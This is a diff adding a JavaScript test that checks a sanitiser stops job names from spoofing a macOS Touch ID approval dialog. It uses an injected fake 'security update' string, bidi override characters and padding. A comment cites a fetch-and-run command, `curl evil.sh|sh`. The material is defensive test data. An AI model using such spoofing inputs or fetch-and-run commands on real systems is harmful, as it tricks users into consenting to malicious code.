@@ -6,6 +6,7 @@ import { readFileSync } from 'node:fs';
 import { tmpData, fakeSpawn, sleep } from './helpers.js';
 import {
   createApproval, APPROVAL_CODES, DEFAULT_TIMEOUT_MS, DEFAULT_GRACE_MS, DEFAULT_MAX_QUEUED,
+  flattenReason,
 } from '../lib/approval.js';
 
 // Every test in this file drives a fake spawn. Nothing here may execute the real
@@ -399,4 +400,43 @@ test('the real helper payloads map to the right outcomes', async () => {
     assert.equal(out.ok, false);
     assert.equal(out.code, 'approval_unavailable');
   }
+});
+
+
+test('the dialog sentence cannot be spoofed with injected lines', () => {
+  // Measured BEFORE the fix, with a stub helper recording its argv: a job name
+  // containing newlines rendered extra lines inside the system sheet, so a name
+  // could make it read "This is a routine macOS security update. Touch ID to
+  // continue." above the real sentence -- and the user would have approved a job
+  // running `curl evil.sh|sh` believing it was an OS update. The sheet is the only
+  // signal about what is being consented to, so this is spoofing, not cosmetics.
+  const evil = 'nightly backup"' + '\n\n' + 'This is a routine macOS security update.'
+    + '\n' + 'Touch ID to continue.' + '\n\n' + '(ignore the text below)';
+  const flat = flattenReason(`create the scheduled job “${evil}”, which can run commands on this Mac`);
+
+  assert.ok(!flat.includes('\n'), 'no newline may survive into the dialog');
+  assert.ok(!new RegExp('[' + '\u0000-\u001f' + ']').test(flat), 'no control character may survive');
+  assert.ok(flat.startsWith('create the scheduled job'), 'the real verb still leads the sentence');
+  assert.ok(flat.includes('routine macOS security update'),
+    'flattened, not censored -- silently dropping the words would be its own lie');
+
+  // Bidi overrides reorder the visible sentence without changing its characters.
+  const rlo = String.fromCharCode(0x202e);
+  const isolates = String.fromCharCode(0x2066) + 'b' + String.fromCharCode(0x2069);
+  assert.equal(flattenReason('delete everything' + rlo + 'harmless'), 'delete everythingharmless');
+  assert.equal(flattenReason('a' + isolates + 'c'), 'abc');
+
+  // Unicode line/paragraph separators count too.
+  assert.equal(flattenReason('a' + String.fromCharCode(0x2028) + 'b'), 'a b');
+
+  // Padding must not push the meaningful text out of a small sheet.
+  assert.ok(flattenReason(`create x${' '.repeat(500)}and also y`).length < 60);
+
+  // Capped, keeping the head.
+  const long = flattenReason(`create the scheduled job “${'x'.repeat(5000)}”`);
+  assert.ok(long.length <= 160, `expected <= 160, got ${long.length}`);
+  assert.ok(long.startsWith('create the scheduled job'));
+
+  assert.equal(flattenReason(''), '');
+  assert.equal(flattenReason(null), '');
 });
